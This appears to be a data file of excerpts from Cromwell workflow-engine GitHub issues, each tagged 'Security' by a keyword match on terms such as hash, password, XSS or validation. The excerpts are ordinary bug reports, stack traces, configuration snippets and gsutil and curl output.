",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4082:1100,Hash,HashMap,1100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4082,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"eg something like:; ```; $ cromwell quickstart; ## BACKEND ##; Would you like to run tasks [local], [sge] or [papi] (Google cloud)?; > [local] | papi; Installing gcloud......; Done! Would you like me to run [gcloud auth] for you to get default credentials set up?; > [yes] |; Running gcloud auth.......; Done!; Backend setup complete!. ## DATABASE ##; Would you like to keep a database of past runs (eg so that you can call-cache?); > [yes] | ; Would you like to use [mysql] or [hsqldb] file?; > [mysql] | ; MySQL detected. Will not reinstall.; Please enter a MySQL username:; > [root] | chris; Please enter the MySQL password:; > [] |; Database setup complete!. ## SETTING UP YOUR SYSTEM ##; Writing start/stop script to /usr/local/bin/cromwell.server...; Writing configuration file to /etc/cromwell/cromwell.conf... To run Cromwell you can now run:; # cromwell.server start; # cromwell submit <wdl> -i <inputs.json>. Good luck!; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2624:618,password,password,618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2624,1,['password'],['password']
Security,"ehavior in PAPI that causes the task to hang for half an hour!. Since PAPI is on its way out and this error message still seems to be checked in [a different test case](https://github.com/broadinstitute/cromwell/pull/4718/files#diff-a348345a036a680f8e29070f0972f61b09f3f640f26b188504d69d5a7f71b554), I am recommending we just delete the test instead of spending any more time on this. ```; > gcloud beta lifesciences operations describe projects/1005074806481/locations/us-central1/operations/8650136336352694244 --format=json; {; ""done"": true,; ""error"": {; ""code"": 9,; ""message"": ""Execution failed: generic::failed_precondition: while running \""-c /bin/bash /cromwell_root/gcs_localization.sh\"": unexpected exit status 1 was not ignored""; },; ""metadata"": {; ""@type"": ""type.googleapis.com/google.cloud.lifesciences.v2beta.Metadata"",; ""createTime"": ""2023-12-04T20:36:45.056562Z"",; ""endTime"": ""2023-12-04T21:10:43.697318162Z"" # <- WTF!!; }; [...]; ```. ```; Long duration; Warning: arning] Using a password on the command line interface can be insecure.; +--------------------------------------+-----------------+----------------------------+----------------------------+; | name | RUNTIME_MINUTES | start | end |; +--------------------------------------+-----------------+----------------------------+----------------------------+; | localize_file_larger_than_disk_space | 35 | 2023-12-05 01:01:27.836000 | 2023-12-05 01:37:10.789000 |; | lots_of_inputs | 32 | 2023-12-05 01:02:03.292000 | 2023-12-05 01:34:26.490000 |; | draft3_call_cache_capoeira | 27 | 2023-12-05 01:03:01.338000 | 2023-12-05 01:30:34.171000 |; ```. ```; Late finishers; Warning: arning] Using a password on the command line interface can be insecure.; +------------------------------------------+-----------------+----------------------------+----------------------------+; | name | runtime_minutes | start | END |; +------------------------------------------+-----------------+----------------------------+------------------------",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7330:1425,password,password,1425,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7330,1,['password'],['password']
Security,"eive$(Actor.scala:512); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, M",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5388,Validat,Validation,5388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['Validat'],['Validation']
Security,elImpl.read(FileChannelImpl.java:159); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:794); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); Mar ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:2161,hash,hash,2161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['hash'],['hash']
Security,"ely that Google's ""correction"" mentioned above was to fix the server from returning the wrong ""v1"" hash when ""v2"" was requested-but-not-available. While cromwell only uses the headers via HTTP HEAD, the hashes in the headers and the contents of an HTTP GET _are_ different between v1 and v2. Google tech support have also mentioned that clients may request either hash type, submitting both `Accept` headers, and that one can read the `Content-Type` from the server to determine which `Docker-Content-Digest` was returned. Bodies reformatted by jq for readability:; ```bash; $ curl -i -s -H 'Accept: application/vnd.docker.distribution.manifest.v1+prettyjws' https://gcr.io/v2/google-containers/ubuntu-slim/manifests/0.14; HTTP/1.1 200 OK; Docker-Distribution-API-Version: registry/2.0; Content-Type: application/vnd.docker.distribution.manifest.v1+prettyjws; Content-Length: 2647; Docker-Content-Digest: sha256:781290a693dc805993b19b7b4c5be40f7688f595312646b926abe2baae2fa9ff; Date: Mon, 06 Nov 2017 16:15:32 GMT; Server: Docker Registry; X-XSS-Protection: 1; mode=block; X-Frame-Options: SAMEORIGIN; Alt-Svc: quic="":443""; ma=2592000; v=""41,39,38,37,35"". {; ""name"": ""unused"",; ""tag"": ""unused"",; ""architecture"": ""amd64"",; ""fsLayers"": [; {; ""blobSum"": ""sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4""; },; {; ""blobSum"": ""sha256:1c4816548d6a2a08f89c304bf09503e791a338c4be90629610152124c7285d3f""; }; ],; ""history"": [; {; ""v1Compatibility"": ""{\""architecture\"":\""amd64\"",\""config\"":{\""ArgsEscaped\"":true,\""AttachStderr\"":false,\""AttachStdin\"":false,\""AttachStdout\"":false,\""Cmd\"":[\""/bin/bash\""],\""Domainname\"":\""\"",\""Entrypoint\"":[],\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""ExposedPorts\"":{},\""Hostname\"":\""6f82340aefbb\"",\""Image\"":\""sha256:7e927fe855b39870a9d03f4c3f8ae4b764d5e6847cdd0b7cee4be942e1ccc871\"",\""Labels\"":{},\""MacAddress\"":\""\"",\""NetworkDisabled\"":false,\""OnBuild\"":[],\""OpenStdin\"":false,\""Shell\"":[],\""StdinOnce\"":false,\""S",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2826:1771,XSS,XSS-Protection,1771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2826,1,['XSS'],['XSS-Protection']
Security,"ems to cause the following unhandled stacktrace:. ```; [2023-11-07 14:51:14,22] [info] MaterializeWorkflowDescriptorActor [4e522458]: Call-to-Backend assignments:; [2023-11-07 14:51:17,38] [error] Cannot construct WomMapType(WomStringType,WomOptionalType(WomAnyType)) with mixed types in map values: [WomOptionalValue(WomSingleFileType,Some(WomSingleFile(c.txt))), WomOptionalValue(WomAnyType,None)]; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomOptionalType(WomAnyType)) with mixed types in map values: [WomOptionalValue(WomSingleFileType,Some(WomSingleFile(c.txt))), WomOptionalValue(WomAnyType,None)]; 	at wom.values.WomMap.<init>(WomMap.scala:65); 	at wom.values.WomMap$.apply(WomMap.scala:50); 	at wom.values.WomMap$.coerceMap(WomMap.scala:30); 	at wom.values.WomMap$.apply(WomMap.scala:46); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.$anonfun$evaluateValue$12(LiteralEvaluators.scala:89); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:86); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:74); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.transforms.biscayne.linking.expression.values.package$$anon$1.evaluateValue(values.scala:38); 	at wdl.transforms.biscayne.linking.expression.values.package$$anon$1.evaluateValue(values.scala:23); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249:1675,Validat,Validated,1675,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249,1,['Validat'],['Validated']
Security,"end.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OT",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5420,validat,validation,5420,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['validat'],['validation']
Security,ent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.access$7,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7318,secur,security,7318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['secur'],['security']
Security,"ent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2715,access,access,2715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"entation of the S3 filesystem in Cromwell:. - There's an implementation of [S3 specific](https://github.com/broadinstitute/cromwell/blob/develop/filesystems/s3/src/main/scala/cromwell/filesystems/s3/batch/S3BatchIoCommand.scala) IoCommands but they are not effectively being treated in any specific way anywhere. They would need to be matched [here](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/IoActor.scala#L119) and processed subsequently in an S3 specific manner, like it's currently done for GCS, to be useful. Because this isn't the case now, the S3 code in `S3BatchIoCommand` is effectively never called.; - It works because there is an implementation of java nio for S3. The `S3BatchIoCommand` ends up in the [NioFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala) which uses the methods of the nio interface to execute the commands.; **A big issue is that the nio interface does not have a ""hash"" method**. To work around that, the `NioFlow` [streams down the content and md5s it](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L111), [unless told otherwise](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109). This is what's currently happening to S3 files. As a final twist, it turns out the [pattern match on GcsPath](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109) in the hash method is actually just a fail safe but is not really needed. That is because some `IoCommand`s, including the `IoHashCommand`, are subclassed as `GcsBatchIoCommand`s and are processed through the [GcsBatchFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4463:1070,hash,hash,1070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4463,1,['hash'],['hash']
Security,"entrifuge.domain,; database=if defined(centrifuge.database) then centrifuge.database else ""refseq""; }; }; }; ```; The `centrifugeList` is a list of dictionaries. The resulting `centrifuge` `object` may or may not have a key database. . ## Expected behaviour:; `database` defaults to `""refseq""` if no `database` key is present in the dictionary. It will use the database key if it exists. ## Observed behaviour:; ```; java.lang.RuntimeException: Evaluating if defined(centrifuge.database) then centrifuge.database else ""refseq"" failed: Could not find key database in WdlObject; at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2(ExpressionKey.scala:36); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2$adapted(ExpressionKey.scala:31); at scala.Function1.$anonfun$andThen$1(Function1.scala:52); at cats.data.Validated.fold(Validated.scala:14); at cats.data.Validated.bimap(Validated.scala:109); at cats.data.Validated.map(Validated.scala:152); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:31); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$4(WorkflowExecutionActor.scala:452); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$2(WorkflowExecutionActor.scala:449); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$1(WorkflowExecutionActor.scala:448); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processRunnableTaskCallInputExpression(WorkflowExecutionActor.scala:447); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$startRunnableNodes$4(Wor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093:1159,Validat,Validated,1159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093,1,['Validat'],['Validated']
Security,"ents (cores, ram etc) to AWSBatch? . I am executing a CWL workflow with AWS batch backend. ; Each task is submitted by cromwell and I can verify on AWS console that all jobs ended successfully.; However, for jobs that I have set coresMin and coresMax requirements I get the warning:. ```; [warn] AwsBatchAsyncBackendJobExecutionActor [6bd79e09fastqc_1:NA:1]: Unrecognized runtime attribute keys: cpuMax; ```. and at the end of the workflow the error:; ```; [error] Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:1032,Validat,ValidatedRuntimeAttributesBuilder,1032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,"er Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COPY ./app-config /app-config. ENTRYPOINT [""/bin/sh"", ""-c""]; ```. when i submit a wdl did not use docker it was ok. but when i submit a wdl need to use docker, a error apear.; ```; /cromwell-working-dir/cromwell-executions/RNAseq/26e3c339-39d3-442f-b93e-8269dc7f9fa6/call-fastp_pe/shard-7/execution/script.submit: line 2: docker: command not found; ```. Is that means I shoud install a docker deamon in cromwe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:2258,hash,hashing,2258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['hash'],['hashing']
Security,er-15 ERROR - WorkflowActor [UUID(88b21d2d)]: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log.; java.util.NoSuchElementException: None.get; at scala.None$.get(Option.scala:347) ~[cromwell.jar:0.19]; at scala.None$.get(Option.scala:345) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$map$2.apply(TraversableLike.scala:728) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:727) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:153) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:233) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.Workfl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:1175,Hash,HashMap,1175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['Hash'],['HashMap']
